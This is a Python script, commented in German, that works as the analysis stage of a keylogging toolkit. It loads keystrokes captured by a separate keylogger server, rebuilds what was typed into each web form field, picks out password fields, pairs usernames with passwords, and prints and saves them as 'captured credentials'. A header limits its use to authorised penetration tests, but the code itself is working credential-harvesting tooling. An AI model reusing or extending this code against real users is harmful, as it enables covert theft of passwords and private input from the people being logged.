#!/usr/bin/env python3
"""
Keystroke Analyzer
Rekonstruiert User-Input aus captured Keystroke-Daten

⚠️ WICHTIG: Nur für autorisierte Penetrationstests verwenden!
"""

import json
from pathlib import Path
from datetime import datetime
from collections import defaultdict

class KeystrokeAnalyzer:
    def __init__(self, keystrokes_file="results/captured_keystrokes.json"):
        self.keystrokes_file = Path(keystrokes_file)
        self.data = self.load_keystrokes()

    def load_keystrokes(self):
        """Lädt Keystroke-Daten aus JSON-Datei"""
        if not self.keystrokes_file.exists():
            print(f"❌ Keine Keystroke-Daten gefunden: {self.keystrokes_file}")
            print(f"   Stelle sicher, dass der Keylogger-Server läuft und Daten empfangen hat.")
            return {}

        with open(self.keystrokes_file, 'r', encoding='utf-8') as f:
            return json.load(f)

    def reconstruct_by_field(self):
        """Rekonstruiert getippten Text gruppiert nach Input-Feld"""
        reconstructed = defaultdict(str)

        for keystroke in self.data.get('all_keystrokes', []):
            field = keystroke['field']
            key = keystroke['key']

            # Handle special keys
            if key == 'Backspace':
                if len(reconstructed[field]) > 0:
                    reconstructed[field] = reconstructed[field][:-1]
            elif key == 'Enter':
                reconstructed[field] += '\n'
            elif key == 'Tab':
                reconstructed[field] += '\t'
            elif key == ' ':
                reconstructed[field] += ' '
            elif len(key) == 1:  # Regular character
                reconstructed[field] += key
            # Ignore special keys like Shift, Ctrl, Alt, etc.

        return dict(reconstructed)

    def reconstruct_by_session(self):
        """Rekonstruiert Text gruppiert nach Session"""
        session_data = {}

        for session_id, session_info in self.data.get('sessions', {}).items():
            reconstructed = defaultdict(str)

            for keystroke in session_info.get('keystrokes', []):
                field = keystroke['field']
                key = keystroke['key']

                if key == 'Backspace':
                    if len(reconstructed[field]) > 0:
                        reconstructed[field] = reconstructed[field][:-1]
                elif key == 'Enter':
                    reconstructed[field] += '\n'
                elif key == 'Tab':
                    reconstructed[field] += '\t'
                elif len(key) == 1:
                    reconstructed[field] += key

            session_data[session_id] = {
                "start_time": session_info.get('start_time'),
                "reconstructed": dict(reconstructed)
            }

        return session_data

    def find_passwords(self):
        """Identifiziert und extrahiert wahrscheinliche Passwörter"""
        passwords = {}
        reconstructed = self.reconstruct_by_field()

        for field, text in reconstructed.items():
            # Check if field name suggests it's a password
            if any(keyword in field.lower() for keyword in ['password', 'pass', 'pwd', 'passwort']):
                passwords[field] = text

        return passwords

    def find_credentials(self):
        """Findet Username/Password Paare"""
        credentials = []
        reconstructed = self.reconstruct_by_field()

        # Common username field names
        username_fields = [f for f in reconstructed.keys()
                          if any(kw in f.lower() for kw in ['username', 'user', 'login', 'email', 'benutzername'])]

        # Common password field names
        password_fields = [f for f in reconstructed.keys()
                          if any(kw in f.lower() for kw in ['password', 'pass', 'pwd', 'passwort'])]

        # Pair them up
        for username_field in username_fields:
            for password_field in password_fields:
                credentials.append({
                    "username_field": username_field,
                    "username": reconstructed[username_field],
                    "password_field": password_field,
                    "password": reconstructed[password_field]
                })

        return credentials

    def get_statistics(self):
        """Berechnet Statistiken"""
        stats = self.data.get('statistics', {})

        # Additional analysis
        all_keystrokes = self.data.get('all_keystrokes', [])

        # Count keystrokes per field
        field_counts = defaultdict(int)
        for ks in all_keystrokes:
            field_counts[ks['field']] += 1

        # Sort by count
        top_fields = sorted(field_counts.items(), key=lambda x: x[1], reverse=True)

        return {
            **stats,
            "keystrokes_per_field": dict(field_counts),
            "top_5_fields": top_fields[:5]
        }

    def analyze_all(self):
        """Führt komplette Analyse durch"""
        if not self.data:
            return

        print("\n" + "="*80)
        print("⌨️  KEYSTROKE ANALYSIS REPORT")
        print("="*80 + "\n")

        # Statistics
        stats = self.get_statistics()
        print(f"📊 STATISTIKEN:")
        print(f"   Total Keystrokes: {stats.get('total_keystrokes', 0)}")
        print(f"   Total Sessions:   {stats.get('total_sessions', 0)}")
        print(f"   Unique IPs:       {stats.get('unique_ips', 0)}")
        print(f"   Fields geloggt:   {len(stats.get('fields_logged', []))}")

        print(f"\n   Top 5 Fields (nach Keystroke-Anzahl):")
        for field, count in stats.get('top_5_fields', [])[:5]:
            print(f"      - {field}: {count} keystrokes")

        # Reconstructed input by field
        print(f"\n{'='*80}")
        print("🔤 REKONSTRUIERTER INPUT (nach Feld):")
        print(f"{'='*80}")

        reconstructed = self.reconstruct_by_field()
        for field, text in reconstructed.items():
            # Highlight password fields
            if 'password' in field.lower():
                print(f"\n🔑 Feld: {field}")
            else:
                print(f"\n📝 Feld: {field}")

            # Truncate long text
            display_text = text if len(text) < 200 else text[:200] + "... (gekürzt)"
            print(f"   Input: \"{display_text}\"")
            print(f"   Länge: {len(text)} Zeichen")
            print(f"{'-'*80}")

        # Passwords
        passwords = self.find_passwords()
        if passwords:
            print(f"\n{'='*80}")
            print("🔐 CAPTURED PASSWORDS:")
            print(f"{'='*80}")
            for field, password in passwords.items():
                print(f"\n   Feld:     {field}")
                print(f"   Password: {password}")
                print(f"{'-'*80}")

        # Credentials
        credentials = self.find_credentials()
        if credentials:
            print(f"\n{'='*80}")
            print("👤 CAPTURED CREDENTIALS:")
            print(f"{'='*80}")
            for i, cred in enumerate(credentials, 1):
                print(f"\n   Credential Set #{i}:")
                print(f"      Username: {cred['username']} (Feld: {cred['username_field']})")
                print(f"      Password: {cred['password']} (Feld: {cred['password_field']})")
                print(f"{'-'*80}")

        # Save analysis
        self.save_analysis(reconstructed, passwords, credentials, stats)

        print(f"\n✅ Analyse abgeschlossen!")
        print(f"   Results gespeichert in:")
        print(f"      - results/keystroke_analysis.json")
        print(f"      - results/reconstructed_input.txt")
        print(f"\n{'='*80}\n")

    def save_analysis(self, reconstructed, passwords, credentials, stats):
        """Speichert Analyse-Ergebnisse"""

        # JSON output
        output_file = Path("results/keystroke_analysis.json")
        output_file.parent.mkdir(parents=True, exist_ok=True)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                "analysis_timestamp": datetime.now().isoformat(),
                "reconstructed_fields": reconstructed,
                "captured_passwords": passwords,
                "captured_credentials": credentials,
                "statistics": stats
            }, f, indent=2, ensure_ascii=False)

        # Text output
        text_file = Path("results/reconstructed_input.txt")
        with open(text_file, 'w', encoding='utf-8') as f:
            f.write("KEYSTROKE ANALYSIS REPORT\n")
            f.write("="*80 + "\n")
            f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            f.write("="*80 + "\n\n")

            f.write("RECONSTRUCTED INPUT BY FIELD\n")
            f.write("-"*80 + "\n\n")
            for field, text in reconstructed.items():
                f.write(f"Field: {field}\n")
                f.write(f"Input: {text}\n")
                f.write(f"Length: {len(text)} characters\n")
                f.write("-"*80 + "\n\n")

            if passwords:
                f.write("\nCAPTURED PASSWORDS\n")
                f.write("-"*80 + "\n\n")
                for field, password in passwords.items():
                    f.write(f"Field:    {field}\n")
                    f.write(f"Password: {password}\n")
                    f.write("-"*80 + "\n\n")

            if credentials:
                f.write("\nCAPTURED CREDENTIALS\n")
                f.write("-"*80 + "\n\n")
                for i, cred in enumerate(credentials, 1):
                    f.write(f"Credential Set #{i}:\n")
                    f.write(f"  Username: {cred['username']}\n")
                    f.write(f"  Password: {cred['password']}\n")
                    f.write("-"*80 + "\n\n")


if __name__ == "__main__":
    try:
        analyzer = KeystrokeAnalyzer()
        analyzer.analyze_all()
    except Exception as e:
        print(f"\n❌ Fehler bei der Analyse: {e}")
        print(f"   Stelle sicher, dass results/captured_keystrokes.json existiert.")
